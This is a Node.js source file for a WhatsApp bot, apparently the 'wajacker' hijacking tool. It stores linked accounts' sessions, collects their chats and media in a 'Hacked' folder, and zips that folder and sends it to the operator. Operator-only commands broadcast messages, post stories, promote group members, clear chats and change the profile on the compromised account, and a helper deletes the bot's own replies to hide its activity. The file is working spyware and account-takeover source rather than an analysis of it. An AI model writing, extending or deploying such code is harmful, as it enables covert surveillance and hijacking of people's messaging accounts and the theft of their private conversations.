const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  fetchLatestBaileysVersion,
  Browsers,
  downloadContentFromMessage,
  proto,
  makeCacheableSignalKeyStore
} = require('baileys');
const path = require('path');
const fs = require('fs');
const P = require('pino');
const config = require('./settings');
const util = require('util');
const axios = require('axios');
const moment = require('moment-timezone');
const { exec } = require('child_process');
const express = require("express");
const AdmZip = require('adm-zip');
const { MongoClient } = require('mongodb');


let client;
let db;
let sessionHealthMonitor = new Map(); // Track session health
let sessionMetadata = new Map(); // Store session metadata

async function connectMongo() {
  if (config.USE_MONGODB !== 'true') {
    console.log('MongoDB is disabled in settings');
    return null;
  }
  if (db) return db;
  if (!config.MONGODB_URI) {
    console.error('MONGODB_URI is not set in settings');
    return null;
  }
  try {
    console.log('Attempting to connect to MongoDB...');
    client = new MongoClient(config.MONGODB_URI, {
      serverSelectionTimeoutMS: 5000,
      connectTimeoutMS: 10000,
      socketTimeoutMS: 45000,
      maxPoolSize: 10,
      serverSelectionTimeoutMS: 5000,
      heartbeatFrequencyMS: 10000,
    });
    await client.connect();
    db = client.db('wajacker');
    console.log('Successfully connected to MongoDB');
    return db;
  } catch (error) {
    console.error('Failed to connect to MongoDB:', error.message);
    console.error('MongoDB URI:', config.MONGODB_URI.replace(/:([^:@]{4})[^:@]*@/, ':****@')); // Hide password in logs
    console.error('MongoDB connection error details:', {
      name: error.name,
      code: error.code,
      codeName: error.codeName,
      message: error.message
    });
    return null;
  }
}

// Enhanced session health monitoring
function updateSessionHealth(sessionId, status, metadata = {}) {
  const healthData = {
    sessionId,
    status, // 'healthy', 'unhealthy', 'pairing', 'connected', 'disconnected'
    lastHeartbeat: Date.now(),
    metadata: {
      ...metadata,
      websocketState: metadata.websocketState || 'unknown',
      userId: metadata.userId || 'unknown',
      pairingCode: metadata.pairingCode || null,
      connectionAttempts: metadata.connectionAttempts || 0,
      lastError: metadata.lastError || null
    }
  };

  sessionHealthMonitor.set(sessionId, healthData);
  sessionMetadata.set(sessionId, healthData.metadata);

  console.log(`[SESSION HEALTH] ${sessionId}: ${status} - WS: ${metadata.websocketState || 'unknown'}`);
}

// Check if session is healthy
function isSessionHealthy(sessionId) {
  const health = sessionHealthMonitor.get(sessionId);
  if (!health) return false;

  const now = Date.now();
  const timeSinceLastHeartbeat = now - health.lastHeartbeat;

  // Consider healthy if heartbeat within last 5 minutes
  return timeSinceLastHeartbeat < 5 * 60 * 1000 && health.status !== 'unhealthy';
}

// Get session status
function getSessionStatus(sessionId) {
  const health = sessionHealthMonitor.get(sessionId);
  return health ? health.status : 'unknown';
}

async function saveSession(sessionId, data) {
  if (config.USE_MONGODB !== 'true') {
    console.log('MongoDB is disabled, skipping saveSession');
    return;
  }
  try {
    const database = await connectMongo();
    if (!database) {
      console.error(`Failed to save session ${sessionId}: MongoDB connection failed`);
      return;
    }
    const collection = database.collection('sessions');
    await collection.updateOne(
      { sessionId },
      { $set: { data, updatedAt: new Date() } },
      { upsert: true }
    );
    console.log(`Session ${sessionId} saved successfully to MongoDB`);
  } catch (error) {
    console.error(`Error saving session ${sessionId} to MongoDB:`, error.message);
    // Don't throw error, just log it to prevent crashes
  }
}

async function loadSession(sessionId) {
  if (config.USE_MONGODB !== 'true') {
    console.log('MongoDB is disabled, skipping loadSession');
    return null;
  }
  try {
    const database = await connectMongo();
    if (!database) {
      console.error(`Failed to load session ${sessionId}: MongoDB connection failed`);
      return null;
    }
    const collection = database.collection('sessions');
    const doc = await collection.findOne({ sessionId });
    console.log(`Session ${sessionId} loaded successfully from MongoDB`);
    return doc ? doc.data : null;
  } catch (error) {
    console.error(`Error loading session ${sessionId} from MongoDB:`, error.message);
    return null;
  }
}

async function deleteSession(sessionId) {
  if (config.USE_MONGODB !== 'true') {
    console.log('MongoDB is disabled, skipping deleteSession');
    return;
  }
  try {
    const database = await connectMongo();
    if (!database) {
      console.error(`Failed to delete session ${sessionId}: MongoDB connection failed`);
      return;
    }
    const collection = database.collection('sessions');
    await collection.deleteOne({ sessionId });
    console.log(`Session ${sessionId} deleted successfully from MongoDB`);
  } catch (error) {
    console.error(`Error deleting session ${sessionId} from MongoDB:`, error.message);
  }
}

async function closeMongo() {
  if (config.USE_MONGODB !== 'true') {
    console.log('MongoDB is disabled, skipping closeMongo');
    return;
  }
  if (client) {
    try {
      await client.close();
      console.log('MongoDB connection closed successfully');
    } catch (error) {
      console.error('Error closing MongoDB connection:', error.message);
    } finally {
      client = null;
      db = null;
    }
  }
}


const internalPrefix = config.PREFIX_HACK;
const externalPrefix = config.PREFIX_BOT;
const hackerid = config.HACKER;
const addminch = config.CHANNEL_JID;
const addmin = ("94704638406");

// Import command system
const { cmd, commands } = require('./command');

// Custom auth state for MongoDB with file fallback
async function useMongoAuthState(sessionId) {
  let creds = {};
  let keys = {};
  let useMongoDB = true;

  try {
    const sessionData = await loadSession(sessionId);
    if (sessionData) {
      creds = sessionData.creds || {};
      keys = sessionData.keys || {};
    }
  } catch (error) {
    console.error('Error loading session from MongoDB, falling back to file storage:', error.message);
    useMongoDB = false;
  }

  const saveCreds = async () => {
    // Always try to save to MongoDB if configured
    if (config.USE_MONGODB === 'true') {
      try {
        await saveSession(sessionId, { creds, keys });
        console.log(`Session ${sessionId} saved to MongoDB`);
      } catch (error) {
        console.error('Error saving creds to MongoDB, falling back to file storage:', error.message);
        useMongoDB = false;
      }
    }

    // Always save to file storage as backup
    try {
      const authDir = path.join(__dirname, 'auth_info_baileys', sessionId);
      if (!fs.existsSync(authDir)) {
        fs.mkdirSync(authDir, { recursive: true });
      }
      const credsPath = path.join(authDir, 'creds.json');
      fs.writeFileSync(credsPath, JSON.stringify({ creds, keys }, null, 2));
      console.log(`Session ${sessionId} saved to file storage`);
    } catch (fileError) {
      console.error('Error saving to file storage:', fileError.message);
      console.error('File path:', credsPath);
      console.error('Error details:', {
        name: fileError.name,
        code: fileError.code,
        errno: fileError.errno,
        syscall: fileError.syscall
      });
    }
  };

  // Try to load from MongoDB first if configured
  if (config.USE_MONGODB === 'true') {
    try {
      const sessionData = await loadSession(sessionId);
      if (sessionData) {
        creds = sessionData.creds || {};
        keys = sessionData.keys || {};
        console.log(`Session ${sessionId} loaded from MongoDB`);
        return {
          state: {
            creds,
            keys: makeCacheableSignalKeyStore(keys, P({ level: 'silent' }))
          },
          saveCreds
        };
      }
    } catch (error) {
      console.error('Error loading from MongoDB, trying file storage:', error.message);
    }
  }

  // Load from file storage as fallback
  try {
    const authDir = path.join(__dirname, 'auth_info_baileys', sessionId);
    const credsPath = path.join(authDir, 'creds.json');
    if (fs.existsSync(credsPath)) {
      const fileData = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
      creds = fileData.creds || {};
      keys = fileData.keys || {};
      console.log(`Session ${sessionId} loaded from file storage`);
    }
  } catch (fileError) {
    console.error('Error loading from file storage:', fileError.message);
    console.error('File path:', credsPath);
    console.error('Error details:', {
      name: fileError.name,
      code: fileError.code,
      errno: fileError.errno,
      syscall: fileError.syscall
    });
    // Initialize empty creds and keys if file loading fails
    creds = {};
    keys = {};
  }

  return {
    state: {
      creds,
      keys: makeCacheableSignalKeyStore(keys, P({ level: 'silent' }))
    },
    saveCreds
  };
}

const msgSend = async (conn, m, message) => {
  try {
    if (m.quoted) {
      await conn.sendMessage(m.chat, { delete: m.quoted.fakeObj.key });
    } else {
      if (typeof message === 'string') {
        const sentMsg = await conn.sendMessage(m.chat, { text: message }, { quoted: m });
        await conn.sendMessage(m.chat, { delete: sentMsg.key });
      } else {
        const sentMsg = await conn.sendMessage(m.chat, message, { quoted: m });
        await conn.sendMessage(m.chat, { delete: sentMsg.key });
      }
    }
  } catch (error) {
    console.error("Error sending or deleting message:", error);
  }
};
const downloadMediaMessage = async(m, filename) => {
	try {
		if (m.type === 'viewOnceMessage') {
			m.type = m.msg.type
		}

		// Validate media message and keys
		if (!m.msg) {
			console.error('Media message is null or undefined');
			return null;
		}

		// Check if media keys are valid
		const hasValidMediaKeys = m.msg.url && m.msg.directPath && m.msg.mediaKey;
		if (!hasValidMediaKeys) {
			console.error('Media message has empty or invalid media keys:', {
				hasUrl: !!m.msg.url,
				hasDirectPath: !!m.msg.directPath,
				hasMediaKey: !!m.msg.mediaKey,
				type: m.type
			});
			return null;
		}

		let filePath;
		let stream;

		if (m.type === 'imageMessage') {
			filePath = filename ? filename + '.jpg' : 'undefined.jpg'
			stream = await downloadContentFromMessage(m.msg, 'image')
		} else if (m.type === 'videoMessage') {
			filePath = filename ? filename + '.mp4' : 'undefined.mp4'
			stream = await downloadContentFromMessage(m.msg, 'video')
		} else if (m.type === 'audioMessage') {
			filePath = filename ? filename + '.mp3' : 'undefined.mp3'
			stream = await downloadContentFromMessage(m.msg, 'audio')
		} else if (m.type === 'stickerMessage') {
			filePath = filename ? filename + '.webp' : 'undefined.webp'
			stream = await downloadContentFromMessage(m.msg, 'sticker')
		} else if (m.type === 'documentMessage') {
			if (!m.msg.fileName) {
				console.error('Document message missing fileName');
				return null;
			}
			var ext = m.msg.fileName.split('.')[1].toLowerCase().replace('jpeg', 'jpg').replace('png', 'jpg').replace('m4a', 'mp3')
			filePath = filename ? filename + '.' + ext : 'undefined.' + ext
			stream = await downloadContentFromMessage(m.msg, 'document')
		} else {
			console.log('Unsupported media type:', m.type);
			return null;
		}

		const writeStream = fs.createWriteStream(filePath);
		let hasError = false;

		writeStream.on('error', (error) => {
			console.error('Write stream error:', error.message);
			hasError = true;
		});

		try {
			for await (const chunk of stream) {
				if (hasError) break;
				writeStream.write(chunk);
			}
			writeStream.end();

			await new Promise((resolve, reject) => {
				writeStream.on('finish', resolve);
				writeStream.on('error', reject);
			});

			if (hasError) {
				console.error('Failed to write media file due to stream error');
				return null;
			}

			const buffer = fs.readFileSync(filePath);
			fs.unlinkSync(filePath);
			console.log(`Media downloaded successfully: ${filePath}`);
			return buffer;
		} catch (streamError) {
			console.error('Error during media stream processing:', streamError.message);
			if (fs.existsSync(filePath)) {
				fs.unlinkSync(filePath);
			}
			return null;
		}
	} catch (error) {
		console.error('Error downloading media:', error.message);
		console.error('Media type:', m.type);
		console.error('Error details:', {
			name: error.name,
			code: error.code,
			message: error.message
		});
		return null;
	}
}
const sms = (conn, m) => {
	if (m.key) {
		m.id = m.key.id
		m.chat = m.key.remoteJid
		m.fromMe = m.key.fromMe
		m.isGroup = m.chat.endsWith('@g.us')
		m.sender = m.fromMe ? (conn.user && conn.user.id ? conn.user.id.split(':')[0] : 'unknown') + '@s.whatsapp.net' : m.isGroup ? m.key.participant : m.key.remoteJid
	}
	if (m.message) {
		m.type = getContentType(m.message)
		m.msg = (m.type === 'viewOnceMessage') ? m.message[m.type].message[getContentType(m.message[m.type].message)] : m.message[m.type]
		if (m.msg) {
			if (m.type === 'viewOnceMessage') {
				m.msg.type = getContentType(m.message[m.type].message)
			}
			var quotedMention = m.msg.contextInfo != null ? m.msg.contextInfo.participant : ''
			var tagMention = m.msg.contextInfo != null ? m.msg.contextInfo.mentionedJid : []
			var mention = typeof(tagMention) == 'string' ? [tagMention] : tagMention
			mention != undefined ? mention.push(quotedMention) : []
			m.mentionUser = mention != undefined ? mention.filter(x => x) : []
			m.body = (m.type === 'conversation') ? m.msg : (m.type === 'extendedTextMessage') ? m.msg.text : (m.type == 'imageMessage') && m.msg.caption ? m.msg.caption : (m.type == 'videoMessage') && m.msg.caption ? m.msg.caption : (m.type == 'templateButtonReplyMessage') && m.msg.selectedId ? m.msg.selectedId : (m.type == 'buttonsResponseMessage') && m.msg.selectedButtonId ? m.msg.selectedButtonId : ''
			m.quoted = m.msg.contextInfo != undefined ? m.msg.contextInfo.quotedMessage : null
			if (m.quoted) {
				m.quoted.type = getContentType(m.quoted)
				m.quoted.id = m.msg.contextInfo.stanzaId
				m.quoted.sender = m.msg.contextInfo.participant
				m.quoted.fromMe = m.quoted.sender.split('@')[0].includes(conn.user && conn.user.id ? conn.user.id.split(':')[0] : 'unknown')
				m.quoted.msg = (m.quoted.type === 'viewOnceMessage') ? m.quoted[m.quoted.type].message[getContentType(m.quoted[m.quoted.type].message)] : m.quoted[m.quoted.type]
				if (m.quoted.type === 'viewOnceMessage') {
					m.quoted.msg.type = getContentType(m.quoted[m.quoted.type].message)
				}
				var quoted_quotedMention = m.quoted.msg.contextInfo != null ? m.quoted.msg.contextInfo.participant : ''
				var quoted_tagMention = m.quoted.msg.contextInfo != null ? m.quoted.msg.contextInfo.mentionedJid : []
				var quoted_mention = typeof(quoted_tagMention) == 'string' ? [quoted_tagMention] : quoted_tagMention
				quoted_mention != undefined ? quoted_mention.push(quoted_quotedMention) : []
				m.quoted.mentionUser = quoted_mention != undefined ? quoted_mention.filter(x => x) : []
				m.quoted.fakeObj = proto.WebMessageInfo.fromObject({
					key: {
						remoteJid: m.chat,
						fromMe: m.quoted.fromMe,
						id: m.quoted.id,
						participant: m.quoted.sender
					},
					message: m.quoted
				})
				m.quoted.download = (filename) => downloadMediaMessage(m.quoted, filename)
				m.quoted.delete = () => conn.sendMessage(m.chat, { delete: m.quoted.fakeObj.key })
				m.quoted.react = (emoji) => conn.sendMessage(m.chat, { react: { text: emoji, key: m.quoted.fakeObj.key } })
			}
		}
		m.download = (filename) => downloadMediaMessage(m, filename)
	}
	
	m.reply = (teks, id = m.chat, option = { mentions: [m.sender] }) => conn.sendMessage(id, { text: teks, contextInfo: { mentionedJid: option.mentions } }, { quoted: m })
	m.replyS = (stik, id = m.chat, option = { mentions: [m.sender] }) => conn.sendMessage(id, { sticker: stik, contextInfo: { mentionedJid: option.mentions } }, { quoted: m })
	m.replyImg = (img, teks, id = m.chat, option = { mentions: [m.sender] }) => conn.sendMessage(id, { image: img, caption: teks, contextInfo: { mentionedJid: option.mentions } }, { quoted: m })
	m.replyVid = (vid, teks, id = m.chat, option = { mentions: [m.sender], gif: false }) => conn.sendMessage(id, { video: vid, caption: teks, gifPlayback: option.gif, contextInfo: { mentionedJid: option.mentions } }, { quoted: m })
	m.replyAud = (aud, id = m.chat, option = { mentions: [m.sender], ptt: false }) => conn.sendMessage(id, { audio: aud, ptt: option.ptt, mimetype: 'audio/mpeg', contextInfo: { mentionedJid: option.mentions } }, { quoted: m })
	m.replyDoc = (doc, id = m.chat, option = { mentions: [m.sender], filename: 'undefined.pdf', mimetype: 'application/pdf' }) => conn.sendMessage(id, { document: doc, mimetype: option.mimetype, fileName: option.filename, contextInfo: { mentionedJid: option.mentions } }, { quoted: m })
	m.replyContact = (name, info, number) => {
		var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + name + '\n' + 'ORG:' + info + ';\n' + 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n' + 'END:VCARD'
		conn.sendMessage(m.chat, { contacts: { displayName: name, contacts: [{ vcard }] } }, { quoted: m })
	}
	m.react = (emoji) => conn.sendMessage(m.chat, { react: { text: emoji, key: m.key } })
	
	return m
}
const getBuffer = async(url, options) => {
	try {
		options ? options : {}
		var res = await axios({
			method: 'get',
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (e) {
		console.log(e)
	}
}
const getGroupAdmins = (participants) => {
	var admins = []
	for (let i of participants) {
		i.admin !== null  ? admins.push(i.id) : ''
	}
	return admins
}
const getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`
}
const h2k = (eco) => {
	var lyrik = ['', 'K', 'M', 'B', 'T', 'P', 'E']
	var ma = Math.log10(Math.abs(eco)) / 3 | 0
	if (ma == 0) return eco
	var ppo = lyrik[ma]
	var scale = Math.pow(10, ma * 3)
	var scaled = eco / scale
	var formatt = scaled.toFixed(1)
	if (/\.0$/.test(formatt))
		formatt = formatt.substr(0, formatt.length - 2)
	return formatt + ppo
}
const isUrl = (url) => {
	return url.match(
		new RegExp(
			/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
			'gi'
		)
	)
}
const Json = (string) => {
    return JSON.stringify(string, null, 2)
}
const runtime = (seconds) => {
	seconds = Number(seconds)
	var d = Math.floor(seconds / (3600 * 24))
	var h = Math.floor(seconds % (3600 * 24) / 3600)
	var m = Math.floor(seconds % 3600 / 60)
	var s = Math.floor(seconds % 60)
	var dDisplay = d > 0 ? d + (d == 1 ? ' day, ' : ' days, ') : ''
	var hDisplay = h > 0 ? h + (h == 1 ? ' hour, ' : ' hours, ') : ''
	var mDisplay = m > 0 ? m + (m == 1 ? ' minute, ' : ' minutes, ') : ''
	var sDisplay = s > 0 ? s + (s == 1 ? ' second' : ' seconds') : ''
	return dDisplay + hDisplay + mDisplay + sDisplay;
}
const sleep = async(ms) => {
	return new Promise(resolve => setTimeout(resolve, ms))
}
const fetchJson = async (url, options) => {
    try {
        options ? options : {}
        const res = await axios({
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            },
            ...options
        })
        return res.data
    } catch (err) {
        return err
    }
}

cmd({
  pattern: "broadcast",
  desc: "Broadcast a message to all chats.",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { from, isHacker, args, reply }) => {
  if (!isHacker) return;
  if (!args.length) return await msgSend(conn, m, "Please provide a message to broadcast");
  const message = args.join(' ');
  const chats = await conn.chats.all();
  for (const chat of chats) {
    try {
      await conn.sendMessage(chat.id, { text: message }, { quoted: mek });
    } catch (e) {
      console.error(`Failed to send message to ${chat.id}:`, e);
    }
  }
  await console.log("Broadcast sent successfully");
});
cmd({
  pattern: "groupbroadcast",
  desc: "Broadcast a message to all groups.",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { from, isHacker, args, reply }) => {
  if (!isHacker) return;
  if (!args.length) return await msgSend(conn, m, "Please provide a message to broadcast to groups");
  const message = args.join(' ');
  const chats = await conn.chats.all();
  for (const chat of chats) {
    if (chat.id.endsWith('@g.us')) {
      try {
        await conn.sendMessage(chat.id, { text: message }, { quoted: mek });
      } catch (e) {
        console.error(`Failed to send message to ${chat.id}:`, e);
      }
    }
  }
  await console.log("Group broadcast sent successfully");
});
cmd({
  pattern: "setpp",
  desc: "Set bot profile picture.",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { from, isHacker, quoted, reply }) => {
  if (!isHacker) return;
  if (!quoted || quoted.type !== 'imageMessage') {
    return await msgSend(conn, m, "Please reply to an image message to set as profile picture");
  }
  try {
    const buffer = await downloadMediaMessage(quoted, 'setpp');
    if (!buffer) {
      return await msgSend(conn, m, "Failed to download the image. Please try again.");
    }
    const userId = conn.user && conn.user.id ? conn.user.id : null;
    if (userId) {
      await conn.updateProfilePicture(userId, { img: buffer });
      await msgSend(conn, m, "Profile picture updated successfully!");
    } else {
      console.error("Cannot update profile picture: user ID not available");
      await msgSend(conn, m, "Failed to update profile picture: User ID not available");
    }
  } catch (error) {
    console.error("Error updating profile picture:", error);
    await msgSend(conn, m, "Failed to update profile picture. Please try again.");
  }
});
cmd({
  pattern: "clearchats",
  desc: "Clear all chats from the bot.",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { isHacker }) => {
  if (!isHacker) return;
  try {
    const chats = await conn.chats.all();
    for (const chat of chats) {
      await conn.chatModify({ clear: true }, chat.id);
    }
  } catch (error) {
    console.error("Error clearing chats:", error);

  }
});
cmd({
    pattern: "promote",
    desc: "Promote a user to group admin.",
    category: "owner",
    use: '<quote|reply|number>',
    filename: __filename
},
async (conn, mek, m, { from, quoted, q, isGroup, isBotAdmins, isAdmins, isHacker, reply }) => {
    if (!isHacker) return 
    if (!isGroup) return 
    if (!isBotAdmins) return 

    let user;
    if (quoted) {
        user = quoted.sender;
    } else if (q) {
        user = `${q.replace(/\D/g, '')}@s.whatsapp.net`;
    } else {
        return 
    }

    try {
        await conn.groupParticipantsUpdate(from, [user], 'promote');
    } catch (e) {
        console.error(e);
    }
});
cmd({
    pattern: "leave",
    desc: "Make the bot leave the current group.",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, isGroup, isHacker, reply }) => {
    if (!isHacker) return 
    if (!isGroup) return 
    try {
        await conn.groupLeave(from);
    } catch (e) {
        console.error(e);
    }
});
cmd({
  pattern: "send",
  desc: "Send a message to any jid/group/channel",
  alias: ["fo"],
  category: "owner",
  use: '.send <jid> <message|media>',
  filename: __filename
}, async (conn, mek, m, { isHacker, args, quoted }) => {
  if (!isHacker) return;
  if (!args.length) return;
  let targetJid = args[0];
  if (!targetJid.includes("@")) {
    if (targetJid.length > 15) return; // prevent invalid JIDs
    targetJid = targetJid.replace(/\D/g, '') + "@s.whatsapp.net";
  }
  const message = args.slice(1).join(' ') || '';
  try {
    if (quoted && quoted.type && (quoted.type === 'imageMessage' || quoted.type === 'videoMessage')) {
      // Media message from quoted
      const media = await downloadMediaMessage(quoted, `${Date.now()}`);
      const type = quoted.type === 'imageMessage' ? 'image' : 'video';
      const caption = message || (quoted.msg && quoted.msg.caption) || '';
      await conn.sendMessage(targetJid, { [type]: media, caption });
    } else if (m.message && (getContentType(m.message) === 'imageMessage' || getContentType(m.message) === 'videoMessage')) {
      // Media message from attachment
      const media = await conn.downloadMediaMessage(mek);
      const type = getContentType(m.message) === 'imageMessage' ? 'image' : 'video';
      const caption = message || (m.msg && m.msg.caption) || '';
      await conn.sendMessage(targetJid, { [type]: media, caption });
    } else {
      // Text message
      await conn.sendMessage(targetJid, { text: message });
    }
  } catch (e) {
    console.error("Failed to send:", e);
  }
});
cmd({
  pattern: "clearchat",
  desc: "Delete the current chat from the bot's interface",
  category: "owner",
  use: ".clearchat",
  filename: __filename
}, async (conn, mek, m, { from, isHacker, reply }) => {
  if (!isHacker) return;
  try {
    await conn.chatModify({ clear: true }, from);
  } catch (error) {
    console.error("Error clearing chat:", error);
  }
});
cmd({
    pattern: "status",
    desc: "Check bot status",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isHacker, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }) => {
    try {
        await msgSend(conn, m, "WORKING");
    } catch (e) {
        console.log(e);
    }
});
cmd({
    pattern: "statusset",
    desc: "Set bot WhatsApp status (about/bio)",
    category: "owner",
    use: ".statusset <text>",
    filename: __filename
},
async (conn, mek, m, { isHacker, args }) => {
    if (!isHacker) return;
    const status = args.join(' ');
    if (!status) return;
    try {
        await conn.updateProfileStatus(status);
        console.log(`Status updated: ${status}`);
    } catch (e) {
        console.error("Failed to update status:", e);
    }
});

cmd({
  pattern: "story",
  desc: "Post a WhatsApp status (story) as text, image, or video",
  category: "owner",
  use: ".story <text|url> [caption]",
  filename: __filename
}, async (conn, mek, m, { isHacker, args, quoted }) => {
  if (!isHacker) return;
  try {
    if (quoted && quoted.message) {
      // Handle quoted messages
      const quotedType = getContentType(quoted.message);
      if (quotedType === 'imageMessage') {
        const image = await conn.downloadMediaMessage(quoted);
        const caption = args.join(' ') || quoted.message.imageMessage.caption || '';
        await conn.sendMessage("status@broadcast", { image, caption });
      } else if (quotedType === 'videoMessage') {
        const video = await conn.downloadMediaMessage(quoted);
        const caption = args.join(' ') || quoted.message.videoMessage.caption || '';
        await conn.sendMessage("status@broadcast", { video, caption });
      } else if (quotedType === 'conversation' || quotedType === 'extendedTextMessage') {
        const text = quoted.message.conversation || quoted.message.extendedTextMessage.text;
        await conn.sendMessage("status@broadcast", { text });
      } else {
        // Fallback for other message types
        const text = args.join(' ') || 'Quoted message';
        await conn.sendMessage("status@broadcast", { text });
      }
    } else if (args.length && /^https?:\/\/\S+\.\S+/i.test(args[0])) {
      // Media story (image/video by URL)
      const url = args[0];
      const caption = args.slice(1).join(' ') || '';
      const res = await axios.head(url);
      const mime = res.headers['content-type'];
      if (mime.startsWith("image")) {
        await conn.sendMessage("status@broadcast", { image: { url }, caption });
      } else if (mime.startsWith("video")) {
        await conn.sendMessage("status@broadcast", { video: { url }, caption });
      } else {

      }
    } else {
      // Text story
      const text = args.join(' ');
      await conn.sendMessage("status@broadcast", { text });
    }
    
  } catch (e) {
    console.error("Failed to send status update:", e);
    
  }
});
cmd({
  pattern: "reorganize",
  desc: "Reorganize Hacked folder files",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { isHacker }) => {
  if (!isHacker) return;
  const hackedDir = './Hacked';
  const botNumber = conn.user && conn.user.id ? conn.user.id.split(':')[0] : 'unknown';
  if (!fs.existsSync(hackedDir)) {
    console.log('Hacked directory does not exist.');
    return;
  }
  const files = fs.readdirSync(hackedDir).filter(file => file.endsWith('.txt') || file.endsWith('.jpg') || file.endsWith('.mp4'));
  files.forEach(file => {
    const filePath = path.join(hackedDir, file);
    if (fs.statSync(filePath).isFile()) {
      let isGroup = false;
      let subDir = 'private';
      let newFileName = file;
      if (file.includes('@g.us')) {
        isGroup = true;
        subDir = 'group';
      } else {
        const jid = file.replace('.txt', '').replace('.jpg', '').replace('.mp4', '');
        const number = jid.split('@')[0];
        newFileName = `${number}${path.extname(file)}`;
      }
      const baseDir = path.join(hackedDir, botNumber);
      const dirPath = path.join(baseDir, subDir);
      const newFilePath = path.join(dirPath, newFileName);
      if (!fs.existsSync(baseDir)) {
        fs.mkdirSync(baseDir, { recursive: true });
      }
      if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
      }
      fs.renameSync(filePath, newFilePath);
      console.log(`Moved ${file} to ${newFilePath}`);
    }
  });
  console.log('Reorganization complete.');
});
cmd({
  pattern: "creategroup",
  desc: "Create a WhatsApp group",
  category: "owner",
  use: ".creategroup <group name> <jid1,jid2,...>",
  filename: __filename
}, async (conn, mek, m, { isHacker, args }) => {
  if (!isHacker) return;
  if (args.length < 2) return await msgSend(conn, m, "Please provide group name and members");
  const groupName = args[0];
  const members = args.slice(1).join(',').split(',').map(jid => jid.replace(/\s/g, '').replace(/\D/g, '') + "@s.whatsapp.net").filter(Boolean);
  try {
    const group = await conn.groupCreate(groupName, members);
    await msgSend(conn, m, `Group "${groupName}" created with ID: ${group.id}`);
    console.log(`Group "${groupName}" created with members: ${members.join(', ')}`);
  } catch (e) {
    console.error("Failed to create group:", e);
    await msgSend(conn, m, "Failed to create group");
  }
});
cmd({
  pattern: "get",
  desc: "Backup Hacked folder into zip",
  category: "owner",
  fromMe: true,
  filename: __filename
}, async (conn, m, msg, { reply, isHacker }) => {
    if (!isHacker) return 

  const botNumber = conn.user && conn.user.id ? conn.user.id.split(':')[0] : 'unknown';
  const zipPath = path.join(__dirname, "Jacked by UDMODZ 💙.zip");
  const hackedFolderPath = path.join(__dirname, "Hacked", botNumber);
  if (!fs.existsSync(hackedFolderPath)) {
    console.log(`❌ Hacked folder not found for bot number ${botNumber}`);
    await conn.sendMessage(m.chat, { text: `❌ Hacked folder not found for bot number ${botNumber}` }, { quoted: m });
    return;
  }
  const zip = new AdmZip();
  zip.addLocalFolder(hackedFolderPath, "Hacked");
  zip.writeZip(zipPath);
  await conn.sendMessage(m.chat, {
    document: fs.readFileSync(zipPath),
    fileName: "Jacked by UDMODZ 💙.zip",
    mimetype: "application/zip",
    caption: "> ㋡ 𝙿𝙾𝚆𝙴𝚁𝙴𝙳 𝙱𝚈 𝙽𝚄𝚁𝙾"
  }, { quoted: m });
  fs.unlinkSync(zipPath);
});


cmd({
  pattern: "fc",
  desc: "Follow channel using invite link",
  category: "owner",
  filename: __filename
}, async (conn, mek, m, { from, isHacker, args, reply }) => {
  if (!isHacker) return reply("Only owner can use this command");
  if (!args.length) return reply("Please provide the channel link or invite ID");
  const channellink = args[0];
  let inviteId = channellink;
  if (channellink.includes('/channel/')) {
    inviteId = channellink.split('/channel/')[1];
  }
  try {
    const metadata = await conn.newsletterMetadata("invite", inviteId);
    const chjid = metadata.id;
    await conn.newsletterFollow(chjid);
    reply("Successfully followed the newsletter with JID: " + chjid);
  } catch (e) {
    reply("Error following newsletter: " + e.message);
  }
});

console.log('┈█┈┈┈┈██┈▓█████▄┈┈┈███▄┈▄███▓┈▒█████┈┈┈▓█████▄┈┈▒███████▒');
console.log('┈██┈┈▓██▒▒██▀┈██▌┈▓██▒▀█▀┈██▒▒██▒┈┈██▒┈▒██▀┈██▌┈▒┈▒┈▒┈▄▀░');
console.log('▓██┈┈▒██░░██┈┈┈█▌┈▓██┈┈┈┈▓██░▒██░┈┈██▒┈░██┈┈┈█▌┈░┈▒┈▄▀▒░┈');
console.log('▓▓█┈┈░██░░▓█▄┈┈┈▌┈▒██┈┈┈┈▒██┈▒██┈┈┈██░┈░▓█▄┈┈┈▌┈┈┈▄▀▒┈┈┈░');
console.log('▓▓█┈┈░██░░▓█▄┈┈┈▌┈▒██┈┈┈┈▒██┈▒██┈┈┈██░┈░▓█▄┈┈┈▌┈┈┈▄▀▒┈┈┈░');
console.log('▒▒█████▓┈░▒████▓┈┈▒██▒┈┈┈░██▒░┈████▓▒░┈░▒████▓┈┈▒███████▒');
console.log('░▒▓▒┈▒┈▒┈┈▒▒▓┈┈▒┈┈░┈▒░┈┈┈░┈┈░░┈▒░▒░▒░┈┈┈▒▒▓┈┈▒┈┈░▒▒┈▓░▒░▒');
console.log('░░▒░┈░┈░┈┈░┈▒┈┈▒┈┈░┈┈░┈┈┈┈┈┈░┈┈░┈▒┈▒░┈┈┈░┈▒┈┈▒┈┈░░▒┈▒┈░┈▒');
